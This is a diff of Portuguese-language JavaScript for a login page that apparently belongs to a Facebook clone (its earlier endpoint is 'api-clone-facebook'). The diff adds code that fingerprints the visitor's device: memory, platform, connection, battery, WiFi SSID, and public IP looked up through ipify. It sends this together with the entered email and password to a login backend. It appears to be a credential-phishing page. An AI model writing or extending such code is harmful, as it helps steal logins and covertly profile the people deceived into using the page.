@@ -31,19 +31,71 @@ document.addEventListener('DOMContentLoaded', () => {
     emailInput.addEventListener('input', verificarCampos);
     senhaInput.addEventListener('input', verificarCampos);
 
+    const verificarMemoria = () => {
+        const memoriaTotal = navigator.deviceMemory || 0;
+        if (memoriaTotal < 4) {
+            console.warn('Dispositivo com pouca memória RAM:', memoriaTotal + 'GB');
+        }
+        return memoriaTotal;
+    };
+
+    const verificarPlataforma = () => {
+        const plataforma = navigator.platform.toLowerCase();
+        const plataformasConhecidas = ['win', 'mac', 'linux', 'android', 'iphone'];
+        const plataformaReconhecida = plataformasConhecidas.some(p => plataforma.includes(p));
+        
+        if (!plataformaReconhecida) {
+            console.warn('Plataforma não reconhecida:', plataforma);
+        }
+        return plataforma;
+    };
+
+    const verificarConexao = () => {
+        if (!navigator.connection) return 'Não disponível';
+
+        const conexao = navigator.connection;
+        const tiposConexao = {
+            'slow-2g': 'Conexão muito lenta',
+            '2g': 'Conexão 2G',
+            '3g': 'Conexão 3G',
+            '4g': 'Conexão 4G'
+        };
+
+        return {
+            tipo: tiposConexao[conexao.effectiveType] || conexao.effectiveType,
+            velocidade: conexao.downlink,
+            rtt: conexao.rtt,
+            saveData: conexao.saveData
+        };
+    };
+
+    const obterIpPublico = async () => {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error('Erro ao obter IP público:', error);
+            return 'Não disponível';
+        }
+    };
+
     const coletarInformacoesDispositivo = async () => {
+        const memoriaVerificada = verificarMemoria();
+        const plataformaVerificada = verificarPlataforma();
+        const conexaoVerificada = verificarConexao();
+        const ipPublico = await obterIpPublico();
+
         const info = {
-            plataforma: navigator.platform,
+            plataforma: plataformaVerificada,
             userAgent: navigator.userAgent,
             idioma: navigator.language,
             resolucao: `${window.screen.width}x${window.screen.height}`,
             profundidadeCor: window.screen.colorDepth,
-            memoriaDispositivo: navigator.deviceMemory,
+            memoriaDispositivo: memoriaVerificada,
             processadores: navigator.hardwareConcurrency,
-            conexao: navigator.connection ? {
-                tipo: navigator.connection.effectiveType,
-                velocidade: navigator.connection.downlink
-            } : 'Não disponível',
+            conexao: conexaoVerificada,
+            ipPublico: ipPublico,
             wifi: {}
         };
 
@@ -52,7 +104,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 const bateria = await navigator.getBattery();
                 info.bateria = {
                     nivel: bateria.level * 100,
-                    carregando: bateria.charging
+                    carregando: bateria.charging,
+                    tempoRestante: bateria.dischargingTime
                 };
             }
 
@@ -61,7 +114,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 info.wifi = {
                     ssid: connection.ssid,
                     signalStrength: connection.signalStrength,
-                    security: connection.security
+                    security: connection.security,
+                    frequencia: connection.frequency
                 };
             }
 
@@ -82,7 +136,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
                 const infoDispositivo = await coletarInformacoesDispositivo();
 
-                const response = await fetch('https://api-clone-facebook.onrender.com/login', {
+                const response = await fetch('http://localhost:3000/login', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
